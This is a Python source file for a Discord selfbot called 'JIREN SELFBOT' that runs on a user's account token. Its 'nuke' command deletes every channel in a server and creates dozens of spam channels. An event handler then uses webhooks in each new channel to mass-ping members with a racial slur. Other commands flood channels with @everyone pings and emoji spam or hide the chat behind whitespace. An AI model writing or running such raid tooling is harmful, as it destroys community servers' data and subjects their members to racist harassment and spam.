import discord, random
from discord.ext import commands

print("""
░░░░░██╗██╗██████╗░███████╗███╗░░██╗  ░██████╗███████╗██╗░░░░░███████╗██████╗░░█████╗░████████╗
░░░░░██║██║██╔══██╗██╔════╝████╗░██║  ██╔════╝██╔════╝██║░░░░░██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
░░░░░██║██║██████╔╝█████╗░░██╔██╗██║  ╚█████╗░█████╗░░██║░░░░░█████╗░░██████╦╝██║░░██║░░░██║░░░
██╗░░██║██║██╔══██╗██╔══╝░░██║╚████║  ░╚═══██╗██╔══╝░░██║░░░░░██╔══╝░░██╔══██╗██║░░██║░░░██║░░░
╚█████╔╝██║██║░░██║███████╗██║░╚███║  ██████╔╝███████╗███████╗██║░░░░░██████╦╝╚█████╔╝░░░██║░░░
░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░
""")  #LMAO
mk = commands.Bot(command_prefix="!!", self_bot=True)

@mk.event
async def on_ready():
    print("Ready.")
    await mk.change_presence(activity=discord.Streaming(name="power", url="https://twitch.com/owo"))

@mk.command()
async def menù(ctx):
    await ctx.message.delete()
    await ctx.send("""
> **JIREN SELFBOT**

> ```nuke         || simple nuke                    ```
> ```spam         || spam a message (str+int)       ```
> ```delete       || purge (int)                    ```
> ```flood        || flood                          ```
> ```ducks        || send random ducks              ```
> ```white        || clear the chat                 ```
> ```sponsor      || sponsor the sex                ```

https://tenor.com/view/jiren-power-dragon-ball-meditate-gif-9355336               
""")          #embed patched? 

@mk.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.send("https://tenor.com/view/jiren-goku-dragon-ball-z-fight-punch-gif-9945919")
    try:   
        for sex in ctx.guild.channels:
            await sex.delete()
        for sex in range(69):
            await ctx.guild.create_text_channel("sex")
    except: 
        pass

@mk.event
async def on_guild_channel_create(channel):
    try:
        oscuro = await channel.create_webhook(name="oscuro")
        for sex in range(69):
            await oscuro.send(content="negro @here")
    except:
        pass

@mk.command()
async def spam(ctx, message, *, amount:int):
    await ctx.message.delete()
    for sex in range(amount):
        await ctx.send(message)

@mk.command()
async def delete(ctx, amount:int):
    await ctx.message.delete()
    async for slave in ctx.message.channel.history(limit=amount):
        if slave.author == mk.user:
            await slave.delete()

@mk.command()
async def flood(ctx):
    await ctx.message.delete()
    for sex in range(20):   
        emojis = """
🤡😱💸💯🥵🔥🗿🥶🧢✅🙂☕😂😎💩❤️✝️😋
😋✝️❤️💩😎😂☕🙂✅🧢🥶🗿🔥🥵💯💸😱🤡"""
        await ctx.send(f"""@everyone\n{emojis*11}
https://tenor.com/view/drip-goku-roadman-goku-nike-tings-gif-19862707
https://tenor.com/view/omori-gif-26202582
https://tenor.com/view/meme-gif-24752206""")
@mk.command()
async def ducks(ctx):
    await ctx.message.delete()
    ducks = f"https://random-d.uk/api/randomimg?t=16260204229{random.randint(1,99)}"
    await ctx.send(ducks)

@mk.command()
async def sponsor(ctx):
    await ctx.message.delete()
    await ctx.send("""
    `Me: https://komodoooo.github.io`
    The **S.E.S.S.O.** organization:
    https://github.com/S-E-S-S-O
    """)

@mk.command()
async def white(ctx):
    await ctx.message.delete()
    invisible = """
⁢ \n""" * 500
    await ctx.send(invisible)

try:
    mk.run(input("token: "), bot=False)
except Exception as owo:
    print(f"Problem: {owo}")
